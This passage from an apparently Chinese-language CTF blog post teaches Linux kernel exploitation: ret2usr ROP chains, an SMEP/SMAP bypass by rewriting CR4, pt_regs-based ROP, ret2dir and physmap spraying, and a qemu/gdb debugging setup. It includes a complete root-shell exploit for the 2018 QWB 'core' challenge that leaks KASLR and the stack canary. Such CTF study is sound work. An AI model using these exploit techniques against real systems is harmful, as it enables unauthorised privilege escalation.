+</code></pre><p>随后<code>ROP chain</code>便可以简化为如下形式：</p>
+<pre tabindex="0"><code>// commit_creds(prepare_kernel_cred(NULL));
+rop_chain[i++] = (size_t)userland_root_shell;
+rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
+rop_chain[i++] = 0; // pop_fq
+rop_chain[i++] = IRETQ_RET + offset;
+rop_chain[i++] = (size_t)get_root_shell;
+rop_chain[i++] = user_cs;
+rop_chain[i++] = user_rflags;
+rop_chain[i++] = user_sp;
+rop_chain[i++] = user_ss;
+</code></pre><h3 id="smep--smap-bypass">smep &amp;&amp; smap bypass<a hidden class="anchor" aria-hidden="true" href="#smep--smap-bypass">#</a></h3>
+<p>若内核开启了<code>smep/smap</code>机制，那么内核态无法访问用户态的代码并执行，否则会引起<code>panic</code>。然而，控制<code>smep/smap</code>是否开启的变量实际上是存储在<code>cr4</code>寄存器中的，这意味着我们可以通过<code>ROP</code>将其关闭。</p>
+<p>在未开启<code>smep/smap</code>机制时，<code>cr4</code>的值一般为<code>0x6f0</code>（是的，一般），因此我们将其修改为这个值就可以绕过<code>smep/smap</code>机制。</p>
+<p>如下所示，我们修改<code>start.sh</code>文件，使其开启<code>smep/smap</code>：</p>
+<pre tabindex="0"><code>qemu-system-x86_64 \
+-m 256M \
+-kernel ./bzImage \
+-cpu qemu64-v1,+smep,+smap \ # 在这里，开启smep和smap，注意无空格否则报错
+-initrd  ./core.cpio \
+-append &#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&#34; \
+-s  \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic
+</code></pre><p>此时我们修改<code>rop_chain</code>为如下状态即可：</p>
+<pre tabindex="0"><code>rop_chain[i++] = POP_RAX_RET + offset;
+rop_chain[i++] = 0x6f0;
+rop_chain[i++] = MOV_CR4_RAX_PUSH_RCX_POPFQ_RET + offset;
+rop_chain[i++] = (size_t)userland_root_shell;
+rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
+rop_chain[i++] = 0; // pop_fq
+rop_chain[i++] = IRETQ_RET + offset;
+rop_chain[i++] = (size_t)get_root_shell;
+rop_chain[i++] = user_cs;
+rop_chain[i++] = user_rflags;
+rop_chain[i++] = user_sp;
+rop_chain[i++] = user_ss;
+</code></pre><p>虽然但是，我们上面指定了<code>cpu</code>型号为<code>qemu64-v1</code>，因为其他<code>CPU</code>默认开启<code>kpti</code>机制（例如一般指定的<code>kvm64</code>），导致在内核页表下的用户地址无可执行权限，会直接导致<code>panic</code>。<code>byebye ret2usr</code>。</p>
+<h2 id="pt_regs结构体">pt_regs结构体<a hidden class="anchor" aria-hidden="true" href="#pt_regs结构体">#</a></h2>
+<p>在用户态下，我们经常使用系统调用产生中断，以切换到内核态来执行函数，例如<code>x86-64</code>中的<code>syscall</code>。</p>
+<p>然而，我们知道<code>64</code>位下前<code>6</code>个参数都位于寄存器中，而系统调用的值实际上也需要进行寻址，那么如何对寄存器寻址呢？实际上，这是因为当程序进入到内核态的时候，操作系统会将所有的寄存器压入到内核栈上，形成一个<code>pt_regs</code>结构体。而该结构体实际上位于内核栈底，<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44">定义</a>如下：</p>
+<pre tabindex="0"><code>struct pt_regs {
+/*
+ * C ABI says these regs are callee-preserved. They aren&#39;t saved on kernel entry
+ * unless syscall needs a complete, fully filled &#34;struct pt_regs&#34;.
+ */
+    unsigned long r15;
+    unsigned long r14;
+    unsigned long r13;
+    unsigned long r12;
+    unsigned long rbp;
+    unsigned long rbx;
+/* These regs are callee-clobbered. Always saved on kernel entry. */
+    unsigned long r11;
+    unsigned long r10;
+    unsigned long r9;
+    unsigned long r8;
+    unsigned long rax;
+    unsigned long rcx;
+    unsigned long rdx;
+    unsigned long rsi;
+    unsigned long rdi;
+/*
+ * On syscall entry, this is syscall#. On CPU exception, this is error code.
+ * On hw interrupt, it&#39;s IRQ number:
+ */
+    unsigned long orig_rax;
+/* Return frame for iretq */
+    unsigned long rip;
+    unsigned long cs;
+    unsigned long eflags;
+    unsigned long rsp;
+    unsigned long ss;
+/* top of stack page */
+};
+</code></pre><p>有点用户态下的<code>srop</code>的味道了。</p>
+<p>到这里，我们需要了解内核中的<code>pt_regs</code>结构体，了解我们用户态发起系统调用时内核态下参数的存放位置。不难想到，我们可以借助<code>pt_regs</code>中的值来进行某些操作，例如栈迁移等。</p>
+<p>因此，在进行系统调用时，我们可以利用如下板子，如此可以找到内核栈上的<code>pt_regs</code>结构体：</p>
+<pre tabindex="0"><code>__asm__(
+    &#34;mov r15,   0xbeefdead;&#34;
+    &#34;mov r14,   0x11111111;&#34;
+    &#34;mov r13,   0x22222222;&#34;
+    &#34;mov r12,   0x33333333;&#34;
+    &#34;mov rbp,   0x44444444;&#34;
+    &#34;mov rbx,   0x55555555;&#34;
+    &#34;mov r11,   0x66666666;&#34;
+    &#34;mov r10,   0x77777777;&#34;
+    &#34;mov r9,    0x88888888;&#34;
+    &#34;mov r8,    0x99999999;&#34;
+    &#34;xor rax,   rax;&#34;
+    &#34;mov rcx,   0xaaaaaaaa;&#34;
+    &#34;mov rdx,   8;&#34;
+    &#34;mov rsi,   rsp;&#34;
+    &#34;mov rdi,   seq_fd;&#34;        // 这里假定通过 seq_operations-&gt;stat 来触发
+    &#34;syscall&#34;
+);
+</code></pre><p>通过这个<code>pt_regs</code>结构体，只需要找到形如<code>add rsp, val; ret</code>的<code>gadget</code>即可完成<code>ROP</code>，非常实用。</p>
+<h2 id="ret2dir">ret2dir<a hidden class="anchor" aria-hidden="true" href="#ret2dir">#</a></h2>
+<p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>，原论文见<a href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">此处</a>。</p>
+<p>定义：将内核控制流劫持到物理内存直接映射区域，其中存放的是用户空间数据的内核映射副本。</p>
+<p>此时只需要在溢出后返回用户态中的<code>get</code>函数就可以了</p>
+<p>我们首先来思考一下 <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/x86/x86_64/mm.rst">x86 下的 Linux kernel 的内存布局</a>，存在着这样的一块区域叫做 <code>direct mapping area</code>，<strong>线性地直接映射了整个物理内存空间</strong>：</p>
+<pre tabindex="0"><code>ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)
+</code></pre><p>这块区域的存在意味着：对于一个被用户进程使用的物理页框，<strong>同时存在着一个用户空间地址与内核空间地址到该物理页框的映射</strong>，即我们利用这两个地址进行内存访问时访问的是同一个物理页框。</p>
+<p>当开启了 SMEP、SMAP、PXN 等防护时，内核空间到用户空间的直接访问被禁止，<strong>我们无法直接使用类似 ret2usr 这样的攻击方式</strong>，但利用内核线性映射区对整个物理地址空间的映射，<strong>我们可以利用一个内核空间上的地址访问到用户空间的数据，从而绕过 SMEP、SMAP、PXN 等传统的隔绝用户空间与内核空间的防护手段</strong>。</p>
+<p>下图便是原论文中对 ret2dir 这种攻击的示例，我们在用户空间中布置的 gadget 可以通过 direct mapping area 上的地址<strong>在内核空间中访问到</strong>：</p>
+<img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/ret2dir-shellcode.png" alt="image.png" style="zoom:50%;" />
+<p>但需要注意的是<strong>在新版的内核当中 direct mapping area 已经不再具有可执行权限</strong>，因此我们很难再在用户空间直接布置 shellcode 进行利用，<strong>但我们仍能通过在用户空间布置 ROP 链的方式完成利用</strong>：</p>
+<img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/figure/ret2dir-rop.png" alt="image.png" style="zoom:50%;" />
+<p>比较朴素的一种使用 ret2dir 进行攻击的手法便是：</p>
+<ul>
+<li>利用<code>mmap</code>在用户空间大量喷射内存。</li>
+<li>利用漏洞泄露出内核的 “堆” 上地址（通过 kmalloc 获取到的地址），<strong>这个地址直接来自于线性映射区</strong>。</li>
+<li>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存。</li>
+</ul>
+<p><strong>此时我们就获得了一个映射到用户空间的内核空间地址，我们通过这个内核空间地址便能直接访问到用户空间的数据，从而避开了传统的隔绝用户空间与内核空间的防护手段</strong>。</p>
+<p>需要注意的是我们往往没有内存搜索的机会，因此需要<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code>。</p>
+<h2 id="杂谈">杂谈<a hidden class="anchor" aria-hidden="true" href="#杂谈">#</a></h2>
+<h3 id="成功执行提权函数但没有root权限">成功执行提权函数但没有root权限<a hidden class="anchor" aria-hidden="true" href="#成功执行提权函数但没有root权限">#</a></h3>
+<p>很奇怪的问题，笔者是在做<code>2017 ciscn babydriver</code>的时候遇到了该问题，出现问题时会导致成功执行提权函数但没有<code>root</code>权限。</p>
+<p>最终解决方案是在<code>gcc</code>编译时添加优化选项<code>-Os</code>即可解决，原因笔者尚且未知，此外笔者测试该题目环境中<code>-O2</code>也可以，但别的都不行。</p>
+<h3 id="gadgets寻找">gadgets寻找<a hidden class="anchor" aria-hidden="true" href="#gadgets寻找">#</a></h3>
+<p>有多种方法，但是都非常慢，例如<code>ropper</code>、<code>ROPgadget</code>等。笔者是倾向于使用<code>ropper</code>。</p>
+<p>若程序没有给<code>vmlinux</code>，可以用如下<code>extract-vmlinux</code>脚本跑出来，如下：</p>
+<p>（很难绷的一件事是，我使用<code>2018_qwb_core</code>的<code>vmlinux</code>跑出来的<code>gadgets</code>是错的，但如下方式可以提取出正确的<code>vmlinux</code>，很难评价。）</p>
+<pre tabindex="0"><code>#!/bin/sh
+# SPDX-License-Identifier: GPL-2.0-only
+# ----------------------------------------------------------------------
+# extract-vmlinux - Extract uncompressed vmlinux from a kernel image
+#
+# Inspired from extract-ikconfig
+# (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;
+#
+# (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;
+#
+# ----------------------------------------------------------------------
+
+check_vmlinux()
+{
+	# Use readelf to check if it&#39;s a valid ELF
+	# TODO: find a better to way to check that it&#39;s really vmlinux
+	#       and not just an elf
+	readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1
+
+	cat $1
+	exit 0
+}
+
+try_decompress()
+{
+	# The obscure use of the &#34;tr&#34; filter is to work around older versions of
+	# &#34;grep&#34; that report the byte offset of the line instead of the pattern.
+
+	# Try to find the header ($1) and decompress from here
+	for	pos in `tr &#34;$1\n$2&#34; &#34;\n$2=&#34; &lt; &#34;$img&#34; | grep -abo &#34;^$2&#34;`
+	do
+		pos=${pos%%:*}
+		tail -c+$pos &#34;$img&#34; | $3 &gt; $tmp 2&gt; /dev/null
+		check_vmlinux $tmp
+	done
+}
+
+# Check invocation:
+me=${0##*/}
+img=$1
+if	[ $# -ne 1 -o ! -s &#34;$img&#34; ]
+then
+	echo &#34;Usage: $me &lt;kernel-image&gt;&#34; &gt;&amp;2
+	exit 2
+fi
+
+# Prepare temp files:
+tmp=$(mktemp /tmp/vmlinux-XXX)
+trap &#34;rm -f $tmp&#34; 0
+
+# That didn&#39;t work, so retry after decompression.
+try_decompress &#39;\037\213\010&#39; xy    gunzip
+try_decompress &#39;\3757zXZ\000&#39; abcde unxz
+try_decompress &#39;BZh&#39;          xy    bunzip2
+try_decompress &#39;\135\0\0\0&#39;   xxx   unlzma
+try_decompress &#39;\211\114\132&#39; xy    &#39;lzop -d&#39;
+try_decompress &#39;\002!L\030&#39;   xxx   &#39;lz4 -d&#39;
+try_decompress &#39;(\265/\375&#39;   xxx   unzstd
+
+# Finally check for uncompressed images or objects:
+check_vmlinux $img
+
+# Bail out:
+echo &#34;$me: Cannot find vmlinux.&#34; &gt;&amp;2
+</code></pre><p>用法：</p>
+<pre tabindex="0"><code>./extract-vmlinux ./bzImage &gt; vmlinux
+</code></pre><h3 id="用户组管理">用户组管理<a hidden class="anchor" aria-hidden="true" href="#用户组管理">#</a></h3>
+<p>在<code>etc</code>目录下含有<code>/etc/passwd</code>和<code>/etc/group</code>两个文件，都是用于<code>Linux</code>的用户组管理的。</p>
+<p>其中<code>/etc/group</code>包含系统上用户组的信息，而<code>/etc/passwd</code>包含具体某个用户的信息。</p>
+<p>具体来说，<code>/etc/group</code>中，每一行表示一个组，每个组的条目由四个字段组成，以冒号分隔，包括组名、组密码、组<code>ID</code>、组成员。</p>
+<p>以以下信息为例：</p>
+<pre tabindex="0"><code>root:x:0:
+chal:x:1000:
+</code></pre><p>其中包含两个组，分别为组名为<code>root</code>的组和组名为<code>chal</code>的组。其中：</p>
+<ul>
+<li>两个组的第二个字段均为空，表示密码信息实际上已经不再使用（现在通常由<code>/etc/shadow</code>管理）。</li>
+<li>第三个字段<code>0</code>和<code>1000</code>表示组的<code>ID</code>，其中<code>root</code>组的<code>ID</code>为<code>0</code>而<code>chal</code>组的<code>ID</code>为<code>1000</code>。</li>
+<li>第四个字段为空，表示没有写明组成员具体有哪些。</li>
+</ul>
+<p>而对于<code>/etc/passwd</code>文件，每一行表示一个用户账户，由七个字段组成，同样由冒号分隔，包括用户名、密码、用户<code>ID</code>、组<code>ID</code>、用户信息、家目录、登录<code>shell</code>。</p>
+<p>以以下信息为例：</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/sh
+chal:x:1000:1000:chal:/home/chal:/bin/sh
+</code></pre><p>其中包含两个用户，<code>root</code>用户和<code>chal</code>组。其中：</p>
+<ul>
+<li>第二个字段为密码，不再使用而交由<code>/etc/shadow</code>管理。</li>
+<li>第三个字段表示用户的<code>ID</code>，其中<code>root</code>用户的<code>ID</code>为<code>0</code>而<code>chal</code>用户的<code>ID</code>为<code>1000</code>。</li>
+<li>第四个字段表示组<code>ID</code>，表示用户所属组的<code>ID</code>。</li>
+<li>第五个字段表示用户信息，通常含有用户全名或其他描述性信息。</li>
+<li>第六个字段表示用户的家目录，表示用户的主目录，用户登录后会进入这个目录。</li>
+<li>第七个字段表示登录<code>shell</code>，是用户登录后默认启动的<code>shell</code>。</li>
+</ul>
+<p>了解到上述信息后，我们可以修改<code>rcS</code>文件来修改<code>qemu</code>虚拟机启动后的用户。</p>
+<p>其中，<code>rcS</code>文件是一个启动脚本，用于在系统引导过程中启动一些基本的系统服务和设置环境。在部分文件系统中，根目录下有一个名为<code>init</code>文件即为<code>rcS</code>文件。有时候也会位于<code>/etc</code>中。</p>
+<p><code>init</code>文件中有一行命令如下：</p>
+<pre tabindex="0"><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh
+</code></pre><p>其中<code>setsid</code>命令可以启动一个新的会话，并连续执行了<code>/bin/cttyhack</code>、<code>setuidgid 1000 /bin/sh</code>。其中，以<code>setuidgid</code>命令来以用户组<code>1000</code>启动了一个<code>shell</code>，而<code>1000</code>表示用户组<code>chal</code>。因此，我们将其修改为<code>0</code>，即可让其启动一个拥有<code>root</code>权限的<code>shell</code>来进行调试。</p>
+<h3 id="gdb调试">gdb调试<a hidden class="anchor" aria-hidden="true" href="#gdb调试">#</a></h3>
+<p>回顾<code>2018</code>强网杯<code>core</code>的<code>start.sh</code>：</p>
+<pre tabindex="0"><code>qemu-system-x86_64 \
+-m 64M \    # 内存大小，我这里不够需要改为128M
+-kernel ./bzImage \    # 指定内核文件
+-initrd  ./core.cpio \  # 指定文件系统
+-append &#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&#34; \ # 启动后的配置项，包括开启了kaslr
+-s  \   # 支持gdb连接
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \  
+-nographic  \
+</code></pre><p>其中，我们提到<code>-s</code>表示支持<code>gdb</code>连接。实际上，查阅文档如下：</p>
+<pre tabindex="0"><code>-s              shorthand for -gdb tcp::1234
+</code></pre><p>说明<code>-s</code>实际上是<code>-gdb tcp::1234</code>的缩写，表示该<code>qemu</code>启动的虚拟机支持使用<code>gdb</code>调试，端口为<code>1234</code>。</p>
+<p>因此，我们启动虚拟机后，可以在宿主机启动<code>gdb</code>，然后使用命令<code>target remote :1234</code>来挂载到虚拟机。</p>
+<p>这之后，虚拟机将无法输入任何数据（正在处于被调试状态）。</p>
+<p>我们在<code>gdb</code>中添加符号表，来使得可以在正确的函数上下断点。</p>
+<p>在这之前，需要先获得加载的驱动的基地址，可以通过如下三种方式查看，效果一样：</p>
+<ul>
+<li><code>cat /proc/modules | grep [驱动名]</code></li>
+<li><code>lsmod</code></li>
+<li><code>cat /sys/module/[驱动名]/sections/.text</code></li>
+</ul>
+<p>值得注意的是，上述三种方法<strong>都需要<code>root</code>权限</strong>才可以查看，可以参照上面的用户组部分来在以<code>root</code>权限调试。如下所示：</p>
+<pre tabindex="0"><code>/ $ cat /proc/modules | grep core
+core 16384 0 - Live 0xffffffffc01f1000 (O)
+/ $ lsmod
+core 16384 0 - Live 0xffffffffc01f1000 (O)
+/ $ cat /sys/module/core/sections/.text
+0xffffffffc01f1000
+</code></pre><p>接下来，在<code>gdb</code>中，输入命令<code>add-symbol-file [驱动名] [基地址]</code>来加载函数符号。例如：</p>
+<pre tabindex="0"><code>add-symbol-file core.ko 0xffffffffc01f1000
+</code></pre><p>即可加载函数符号。之后使用<code>b func</code>即可下断点，例如<code>b core_copy_func</code>，即可下断点，之后输入<code>c</code>，此时虚拟机即可正常输入，运行<code>exp</code>后到<code>core_copy_func</code>即会暂停下来。</p>
+<h3 id="编写gdb调试脚本">编写gdb调试脚本<a hidden class="anchor" aria-hidden="true" href="#编写gdb调试脚本">#</a></h3>
+<p>上面我们已经提到了如何使用<code>gdb</code>来调试<code>kernel</code>。然而，每一次输入<code>lsmod</code>、<code>add-symbol-file</code>、<code>target remote:1234</code>等略显繁杂，我们可以利用<code>-ex</code>编写<code>gdb</code>调试脚本如下：</p>
+<pre tabindex="0"><code>gdb -q \
+       -ex &#34;add-symbol-file ./kgadget.ko 0xffffffffc0002000&#34; \
+       -ex &#34;target remote:1234&#34; \
+       -ex &#34;b *0xffffffffc0002116&#34;
+</code></pre><h3 id="内核函数api记录">内核函数api记录<a hidden class="anchor" aria-hidden="true" href="#内核函数api记录">#</a></h3>
+<p>内核中的<code>printf</code>函数。和用户态中区别不大。</p>
+<pre tabindex="0"><code>int printk(const char *fmt, ...);
+</code></pre><p>内核中的<code>memcpy</code>函数。</p>
+<pre tabindex="0"><code>unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);
+</code></pre><p>以及</p>
+<pre tabindex="0"><code>unsigned long copy_to_user(void __user *to, const void *from, unsigned long n);c
+</code></pre><h3 id="内核结构体查看工具pahole">内核结构体查看工具：pahole<a hidden class="anchor" aria-hidden="true" href="#内核结构体查看工具pahole">#</a></h3>
+<p>在不同内核版本下，结构体的大小可能不尽相同。而<code>pahole</code>是一个可以直接查看结构体的定义和大小的工具，非常方便。</p>
+<p>安装方式如下：</p>
+<pre tabindex="0"><code>sudo apt install libdw-dev
+sudo apt install cmake
+
+git clone https://git.kernel.org/pub/scm/devel/pahole/pahole.git/
+cd pahole
+mkdir build
+cd build
+cmake -D__LIB=lib ..
+sudo make install
+</code></pre><p>安装完成之后，使用非常简单，直接输入即可查看当前内核下所有结构体：</p>
+<pre tabindex="0"><code>pahole
+</code></pre><p>也可以通过如下方式来仅仅查看某个结构体：</p>
+<pre tabindex="0"><code>pahole -C &lt;struct_name&gt;
+// e.g. pagole -C pt_regs
+</code></pre><h3 id="第一个exp-2018_qwb_core">第一个exp: 2018_qwb_core<a hidden class="anchor" aria-hidden="true" href="#第一个exp-2018_qwb_core">#</a></h3>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdarg.h&gt;
+
+void info(const char *format, ...)
+{
+    va_list args;
+    va_start(args, format);
+    printf(&#34;%s&#34;, &#34;\033[34m\033[1m[*] &#34;);
+    vprintf(format, args);
+    printf(&#34;%s&#34;, &#34;\033[0m\n&#34;);
+}
+
+void success(const char *format, ...)
+{
+    va_list args;
+    va_start(args, format);
+    printf(&#34;%s&#34;, &#34;\033[32m\033[1m[+] &#34;);
+    vprintf(format, args);
+    printf(&#34;%s&#34;, &#34;\033[0m\n&#34;);
+}
+
+void error(const char *format, ...)
+{
+    va_list args;
+    va_start(args, format);
+    printf(&#34;%s&#34;, &#34;\033[31m\033[1m[x] &#34;);
+    vprintf(format, args);
+    printf(&#34;%s&#34;, &#34;\033[0m\n&#34;);
+}
+
+size_t commit_creds = 0, prepare_kernel_cred = 0;
+
+size_t user_cs, user_ss, user_rflags, user_sp;
+void save_status()
+{
+    asm volatile(
+        &#34;mov user_cs, cs;&#34;
+        &#34;mov user_ss, ss;&#34;
+        &#34;mov user_sp, rsp;&#34;
+        &#34;pushf;&#34;
+        &#34;pop user_rflags;&#34;);
+    info(&#34;Status has been saved.&#34;);
+}
+
+void get_root_shell(void)
+{
+    if (getuid())
+    {
+        error(&#34;Failed to get the root!&#34;);
+        exit(-1);
+    }
+
+    success(&#34;Successful to get the root. Execve root shell now...&#34;);
+    system(&#34;/bin/sh&#34;);
+}
+
+void core_read(int fd, char *buf)
+{
+    ioctl(fd, 0x6677889B, buf);
+}
+
+void set_off(int fd, int value)
+{
+    ioctl(fd, 0x6677889C, value);
+}
+
+void core_copy_func(int fd, size_t size)
+{
+    ioctl(fd, 0x6677889A, size);
+}
+
+#define POP_RDI_RET 0xffffffff81000b2f
+#define POP_RAX_RET 0xffffffff810520cf
+#define POP_RCX_RET 0xffffffff81021e53
+#define MOV_RDI_RAX_POP_RBP_JMP_RCX 0xffffffff81532471
+#define SWAPGS_POPFQ_RET 0xffffffff81a012da
+#define IRETQ_RET 0xffffffff81050ac2
+
+
+int main()
+{
+    FILE *fd_kallsyms = NULL;
+    size_t addr = 0, offset = 0;
+    char type[0x10], func[0x50];
+    char buf[0x100];
+    size_t canary = 0;
+    int fd = -1;
+    int i = 0;
+    size_t rop_chain[0x100];
+
+    info(&#34;Start to exploit...&#34;);
+    save_status();
+
+    // 第一步：通过查/kallsyms获得所有函数地址
+    fd_kallsyms = fopen(&#34;/tmp/kallsyms&#34;, &#34;r&#34;);
+    if (fd_kallsyms == NULL)
+    {
+        error(&#34;Open kallsyms error.&#34;);
+    }
+
+    while (fscanf(fd_kallsyms, &#34;%lx%s%s&#34;, &amp;addr, type, func))
+    {
+
+        if (prepare_kernel_cred &amp;&amp; commit_creds)
+        {
+            break;
+        }
+        if (!strcmp(func, &#34;prepare_kernel_cred&#34;))
+        {
+            prepare_kernel_cred = addr;
+            success(&#34;prepare_kernel_cred addr found.&#34;);
+        }
+        if (!strcmp(func, &#34;commit_creds&#34;))
+        {
+            commit_creds = addr;
+            success(&#34;commit_creds addr found.&#34;);
+        }
+    }
+
+    // 无kaslr时： 0xffffffff8109cce0
+    printf(&#34;The addr of prepare_kernel_cred is 0x%lx.\n&#34;, prepare_kernel_cred);
+    // 无kaslr时： 0xffffffff8109c8e0
+    printf(&#34;The addr of commit_creds is 0x%lx.\n&#34;, commit_creds);
+
+    offset = prepare_kernel_cred - 0xffffffff8109cce0;
+    printf(&#34;The offset of kaslr is 0x%lx.\n&#34;, offset);
+
+    fd = open(&#34;/proc/core&#34;, 2);
+    if (fd &lt; 0)
+    {
+        error(&#34;Failed to open /proc/core.&#34;);
+        exit(0);
+    }
+
+    set_off(fd, 64);
+    core_read(fd, buf);
+    canary = ((size_t *)buf)[0];
+    info(&#34;The value of canary is 0x%lx.&#34;, canary);
+    printf(&#34;canary: 0x%lx.\n&#34;, canary);
+
+    for (i = 0; i &lt; 10; i++)
+    {
+        rop_chain[i] = canary;
+    }
+
+    // commit_creds(prepare_kernel_cred(NULL));
+    rop_chain[i++] = POP_RDI_RET + offset;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = prepare_kernel_cred;
+    rop_chain[i++] = POP_RCX_RET + offset;
+    rop_chain[i++] = commit_creds;
+    rop_chain[i++] = MOV_RDI_RAX_POP_RBP_JMP_RCX + offset;
+    rop_chain[i++] = 0; // popo_rbp
+    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
+    rop_chain[i++] = 0; // pop_fq
+    rop_chain[i++] = IRETQ_RET + offset;
+    rop_chain[i++] = (size_t)get_root_shell;
+    rop_chain[i++] = user_cs;
+    rop_chain[i++] = user_rflags;
+    rop_chain[i++] = user_sp;
+    rop_chain[i++] = user_ss;
+    
+    
+    write(fd, rop_chain, 0x800);
+
+    core_copy_func(fd, (0xffffffffffff0000 | 0x100));
+    return 0;
+}
+</code></pre><h2 id="例题-mini-lctf2022-kgadget">例题 MINI-LCTF2022-kgadget<a hidden class="anchor" aria-hidden="true" href="#例题-mini-lctf2022-kgadget">#</a></h2>
+<h3 id="题目分析">题目分析<a hidden class="anchor" aria-hidden="true" href="#题目分析">#</a></h3>
+<h3 id="利用思路">利用思路<a hidden class="anchor" aria-hidden="true" href="#利用思路">#</a></h3>
+<h3 id="exp">exp<a hidden class="anchor" aria-hidden="true" href="#exp">#</a></h3>
+<h2 id="利用-pt_regs-构造通用内核-rop">利用 pt_regs 构造通用内核 ROP<a hidden class="anchor" aria-hidden="true" href="#利用-pt_regs-构造通用内核-rop">#</a></h2>
+<h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2ptregs/">利用 pt_regs 构造通用内核 ROP - CTF Wiki</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
